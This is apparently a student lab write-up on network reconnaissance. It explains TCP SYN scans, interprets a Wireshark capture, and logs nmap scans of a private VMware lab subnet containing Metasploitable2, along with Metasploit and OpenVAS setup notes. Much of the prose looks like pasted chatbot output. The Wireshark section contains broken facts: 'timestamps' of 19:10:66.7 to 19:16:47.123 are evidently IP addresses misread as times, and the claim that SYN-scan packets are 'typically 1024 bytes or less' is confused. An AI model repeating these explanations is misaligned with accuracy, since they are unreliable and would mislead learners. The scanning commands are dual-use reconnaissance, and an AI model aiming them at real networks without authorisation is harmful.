# WireShark Updates
### TCP SYN Scans Explained

**TCP SYN Scan Overview:**

- **Avoids Full Three-Way Handshake:** Unlike a typical TCP connection that requires a complete three-way handshake (SYN, SYN-ACK, ACK), a SYN scan only initiates the process by sending a SYN packet. It does not complete the handshake, allowing for a quick and stealthy scan without establishing a full connection.

- **Commonly Executed with nmap -sS:** This type of scan is frequently performed using the `nmap -sS` command, a popular network scanning tool. The `-sS` option instructs nmap to perform a SYN scan, making it efficient for mapping network ports and identifying open services.

- **Requires Privileged Access:** SYN scans typically require elevated user privileges (e.g., root or administrator access) on the scanning system, as they involve crafting raw packets that standard users cannot generate.

- **Packet Size Characteristics:** The packets in a SYN scan are generally small, typically 1024 bytes or less. This is because the scan only sends an initial SYN request without expecting a full data exchange, as the connection is not intended to be completed.

### Detailed Analysis of the Attached Screenshot

The attached image shows a packet capture from Wireshark, a network protocol analyzer, displaying a TCP SYN scan in progress. Here's a breakdown of the key elements:

- **Filter Applied:** The capture is filtered to show packets where `tcp.flags.syn==1` (SYN flag set), `tcp.flags.ack==0` (ACK flag not set), and `tcp.window_size > 1024`. This filter isolates SYN packets that are part of a scan, indicating the start of a connection attempt without an acknowledgment.

- **Packet Details:**
  - **No. and Time:** The capture lists multiple packets (e.g., 0, 2, 3, etc.) with timestamps around 19:10:66.7 to 19:16:47.123, showing a sequence of SYN packets sent over time.
  - **Source and Destination:** The source IP (e.g., 10.10.66.7) sends SYN packets to a destination IP (e.g., 19.16.47.123), indicating the scanning activity targeting a specific host.
  - **Protocol:** All packets are identified as TCP, consistent with a SYN scan.
  - **Info Column:** The info field shows details like "SYN" (synchronize flag set), `Seq=0` (sequence number starts at 0), `Win=62727` (window size), `Len=0` (no data payload), `MSS=8961` (maximum segment size), and `SA` (options like selective acknowledgment). This confirms the packets are initial SYN requests without data, aligning with the characteristics of a SYN scan.

- **Context:** The regular interval and pattern of SYN packets suggest an automated scan, likely conducted with a tool like nmap. The lack of ACK responses or completed handshakes indicates the scan is probing for open ports without establishing connections, a hallmark of a SYN scan.

This analysis highlights the stealth and efficiency of SYN scans, commonly used for network reconnaissance while minimizing detection.

# Tool Validation

1. Nmap: Conducted network discovery to identify live hosts:
![alt text](image-8.png)

![alt text](image-7.png)

The above screenshots are results of an Nmap scan run from a Metasploitable VM to identify active hosts and open ports on the 192.168.232.0/24 subnet. Below is a detailed explanation of each screenshot:

‚úÖ Screenshot 1: Scan Summary of Multiple Hosts
yaml
Copy
Edit
Command: nmap 192.168.232.0/24
Time: 2025-06-03 17:27 EDT
Nmap Version: 4.53
üîç Host: 192.168.232.1
Open Ports:

902/tcp - iss-realsecure-sensor
‚Üí This port is typically used by VMware for remote management.

912/tcp - unknown
‚Üí This port is open but Nmap doesn‚Äôt recognize the service. It may be used by a custom or uncommon application.

MAC Address: 00:50:56:C0:00:08
Vendor: VMware (virtual machine)

üîç Host: 192.168.232.2
Open Ports:

53/tcp - domain
‚Üí This is DNS (Domain Name System), often used by DNS servers.

MAC Address: 00:50:56:E0:42:DC
Vendor: VMware

‚úÖ Screenshot 2: Scan Result of Another Host
üîç Host: 192.168.232.254
All 1714 scanned ports are filtered
‚Üí This indicates that a firewall or filtering mechanism is blocking all probes.

MAC Address: 00:50:56:FC:43:6F
Vendor: VMware

This host is likely a router, firewall (like pfSense), or a hardened VM that drops or blocks Nmap probes.

üîç Previously Scanned Host (Before 254) ‚Äî Possibly Metasploitable2
Open Ports & Services:

445/tcp - microsoft-ds

512/tcp - exec

513/tcp - login

514/tcp - shell

1524/tcp - ingreslock

2049/tcp - nfs (Network File System)

2121/tcp - ccpoxy-ftp (likely a typo or custom FTP service)

3306/tcp - mysql

3632/tcp - distccd (Distributed C/C++ compilation daemon)

5432/tcp - postgres (PostgreSQL DB)

5900/tcp - vnc (Virtual Network Computing)

6000/tcp - X11 (GUI remote access)

6667/tcp - irc (Internet Relay Chat)

8009/tcp - ajp13 (Apache JServ Protocol)

üü® Note: These ports and services are intentionally exposed in Metasploitable2, a vulnerable machine meant for practicing penetration testing.

üìå Conclusion
Nmap scan revealed:

IP Address	Open Ports & Services Summary	Host Type
192.168.232.1	902 (VMware remote), 912 (unknown)	VMware host
192.168.232.2	53 (DNS)	Possibly DNS server
192.168.232.254	All ports filtered	Likely pfSense
Metasploitable2	Numerous open ports (445, 3306, 5432, etc.)	Vulnerable target

If this is part of your cybersecurity lab setup, then:

192.168.232.254 is likely the pfSense firewall.

192.168.232.2 may be DNS or internal server.

192.168.232.1 could be the host machine or another VM.


One of the machines with many services is your Metasploitable2 target.

nmap -sP 192.168.232.0/24

![alt text](image-9.png)

The attached screenshot shows the result of an Nmap command executed from a terminal in a Kali/Metasploitable environment. Let's break it down in detail:

üîç Command Used:
bash
Copy
Edit
nmap -sP 192.168.232.0/24
‚úÖ What it means:
nmap: A powerful network scanning tool used for network discovery and security auditing.

-sP: This is an older option (now equivalent to -sn) that performs a ping scan ‚Äî it checks which hosts are up (online) in the given subnet.

192.168.232.0/24: This indicates a scan of the entire subnet from 192.168.232.0 to 192.168.232.255 (i.e., 256 IP addresses in total).

üìã Scan Output Analysis:
Nmap version: 4.53

The scan was performed at: 2025-06-03 17:32 EDT

üî∏ Detected Hosts (4 hosts are up):
IP Address	MAC Address	Vendor	Status
192.168.232.1	00:50:56:C0:00:08	VMWare	Online (Up)
192.168.232.2	00:50:56:E0:42:DC	VMWare	Online (Up)
192.168.232.130	(MAC not shown)	?	Online (Up)
192.168.232.254	00:50:56:FC:43:6F	VMWare	Online (Up)

The MAC addresses indicate that these systems are virtual machines running on VMWare.

All MAC addresses are prefixed with 00:50:56, which is the Organizationally Unique Identifier (OUI) for VMware, Inc.

192.168.232.130 is a bit unusual in that its MAC is not shown, which may be due to a limitation or a system/network setting.

üß† Key Observations:
Virtual Environment: All detected hosts are virtual, as indicated by their MAC vendor (VMWare).

Network is Up and Running: 4 devices are online and responding to ping requests.

Common Setup: This is typical in a cybersecurity lab environment where:

.1 is often the gateway.

.2, .130, or .254 could be Kali Linux, Metasploitable2, Security Onion, or pfSense depending on your lab configuration.

Performance: The scan completed 256 IPs in just 4.104 seconds, which is efficient for a ping sweep.

‚úÖ Summary:
This is a network discovery scan using nmap -sP, and it successfully identified 4 active machines on the 192.168.232.0/24 subnet ‚Äî all part of a virtualized environment (likely for a cybersecurity lab). This kind of scan is typically the first step in reconnaissance before deeper vulnerability or port scanning.

Let me know if you'd like a network diagram, a follow-up full scan (like -sS), or identification of these IPs based on common lab setups.

2. Metasploit: Launched msfconsole and verified exploit module availability.

3. OpenVAS: Configured and ran a vulnerability scan against Metasploitable2:
openvas-setup
openvas-start

Redis server socket error: No Redis DB.
Interpretation:
Core components of GVM are mostly set up correctly (scanners, permissions, NVTs).
However, a critical issue is detected: Redis service is either not running or misconfigured.
This may impact the scanner‚Äôs ability to start or complete scans.
‚úÖ Assignment Summary
In this OpenVAS setup exercise, I configured a vulnerability scan using Greenbone Security Assistant (GSA). I created a scan task targeting specific assets, configured it using the "Full and fast" scan profile, and submitted it for execution. Although the task was successfully created and requested, scan results were not yet available at the time of review.
Additionally, I verified the system setup using gvm-check-setup. While the scanners and plugins were correctly configured, the Redis database required by ospd-openvas was not running, which may cause the scan task to remain in a pending state. Further troubleshooting is needed to ensure Redis is active to fully utilize OpenVAS capabilities.
